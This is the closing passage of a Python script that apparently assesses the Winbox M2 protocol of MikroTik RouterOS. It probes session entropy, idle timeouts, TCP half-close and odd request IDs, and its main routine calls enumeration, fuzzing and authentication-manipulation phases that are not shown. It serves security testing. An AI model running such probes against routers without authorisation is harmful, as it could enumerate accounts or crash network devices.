                 f"Same={resp1 == resp2 if (resp1 and resp2) else 'N/A'}",
                 {"resp1_hex": safe_hex(resp1), "resp2_hex": safe_hex(resp2)})

    # -- Test 15: Session ID entropy analysis --
    # Collect whatever we can from login responses as potential session material
    entropy_data = []
    for i in range(10):
        resp, _ = winbox_send_recv(m2_build_login_msg(ADMIN_USER), timeout=3)
        if resp:
            entropy_data.append(safe_hex(resp))
        time.sleep(0.1)

    unique_responses = len(set(entropy_data))
    ev.add_test("session", "Response entropy analysis (10 samples)",
                 "Collect 10 login responses and check uniqueness",
                 f"{unique_responses}/10 unique responses",
                 {"unique_count": unique_responses,
                  "total_samples": len(entropy_data)},
                 anomaly=(unique_responses < 5 and len(entropy_data) >= 5))

    if unique_responses < 5 and len(entropy_data) >= 5:
        ev.add_finding(
            "MEDIUM",
            "Low entropy in Winbox handshake responses",
            f"Only {unique_responses}/10 unique responses observed during "
            "login handshake, suggesting poor randomization in session "
            "establishment parameters.",
            cwe="CWE-330",
            cvss="5.3",
        )
    periodic_health_check()

    # -- Test 16-18: Session timeout probing --
    for delay in [1, 5, 10]:
        s = winbox_connect()
        if s:
            s.send(m2_build_login_msg(ADMIN_USER))
            s.settimeout(3)
            try:
                s.recv(8192)
            except socket.timeout:
                pass
            time.sleep(delay)
            # Try sending another frame after delay
            try:
                body = m2_encode_u32(SYS_TO, HANDLER_LOGIN) + m2_encode_u32(COMMAND, 7)
                s.send(m2_encode_frame(body))
                s.settimeout(3)
                try:
                    resp = s.recv(8192)
                    result = f"Response after {delay}s: {len(resp)} bytes"
                except socket.timeout:
                    result = f"No response after {delay}s idle"
                    resp = b""
            except (BrokenPipeError, ConnectionResetError, OSError) as e:
                result = f"Connection closed after {delay}s idle: {e}"
                resp = b""
            s.close()
        else:
            result = "Failed to connect"
            resp = b""

        ev.add_test("session", f"Session timeout after {delay}s idle",
                     f"Hold connection idle for {delay}s then send data",
                     result,
                     {"delay_seconds": delay, "resp_hex": safe_hex(resp)})
    periodic_health_check()

    # -- Test 19: Half-close (shutdown write, keep reading) --
    s = winbox_connect()
    if s:
        s.send(m2_build_login_msg(ADMIN_USER))
        s.settimeout(3)
        try:
            s.recv(8192)
        except socket.timeout:
            pass
        try:
            s.shutdown(socket.SHUT_WR)
            s.settimeout(3)
            try:
                post_shutdown = s.recv(8192)
                result = f"Got {len(post_shutdown)} bytes after SHUT_WR"
            except socket.timeout:
                result = "No data after SHUT_WR (timeout)"
        except Exception as e:
            result = f"Error on half-close: {e}"
        s.close()
    else:
        result = "Failed to connect"
    ev.add_test("session", "TCP half-close (SHUT_WR)",
                 "Shutdown write side of socket after login init",
                 result)

    # -- Test 20: Out-of-order request IDs --
    body = (m2_encode_u32(SYS_TO, HANDLER_LOGIN)
            + m2_encode_u32(REQUEST_ID, 999999)
            + m2_encode_u32(COMMAND, 1)
            + m2_encode_string(USERNAME, ADMIN_USER))
    frame = m2_encode_frame(body)
    resp, elapsed = winbox_send_recv(frame)
    ev.add_test("session", "Out-of-order request ID (999999)",
                 "Send login with very high request ID",
                 f"Response: {len(resp) if resp else 0} bytes",
                 {"resp_hex": safe_hex(resp)})
    periodic_health_check()


# ═══════════════════════════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    log("=" * 60)
    log("MikroTik RouterOS CHR 7.20.8 — Winbox Protocol Assessment")
    log(f"Target: {TARGET}:{WINBOX_PORT}")
    log("Phase 5: Winbox M2 Protocol Attacks")
    log("=" * 60)

    # Pre-flight check
    status = check_router_alive()
    if not status.get("alive"):
        log("ERROR: Router is not responding. Aborting.")
        return
    log(f"Router is alive: version={status.get('version')}, uptime={status.get('uptime')}")

    # Verify Winbox port is open
    s = winbox_connect(timeout=5)
    if not s:
        log(f"ERROR: Cannot connect to {TARGET}:{WINBOX_PORT}. Is Winbox enabled?")
        return
    s.close()
    log(f"Winbox port {WINBOX_PORT} is open.")
    log("")

    try:
        test_m2_protocol_implementation()
        test_preauth_probing()
        test_username_enumeration()
        test_postauth_handler_enum()
        test_m2_fuzzing()
        test_ecsrp5_manipulation()
        test_session_management()
    except Exception as e:
        log(f"FATAL ERROR: {e}")
        traceback.print_exc()
        ev.add_test("fatal", "Unhandled exception",
                     "Script encountered an unhandled error",
                     str(e), {"traceback": traceback.format_exc()},
                     anomaly=True)

    # Final health check
    final_status = check_router_alive()
    if not final_status.get("alive"):
        ev.add_finding(
            "HIGH",
            "Router unresponsive after Winbox assessment",
            "The router did not respond to health checks at the end of "
            "the Winbox assessment. It may have crashed during testing.",
            cwe="CWE-400",
        )
        wait_for_router(max_wait=120)

    ev.save("winbox_attacks.json")
    ev.summary()


if __name__ == "__main__":
    main()
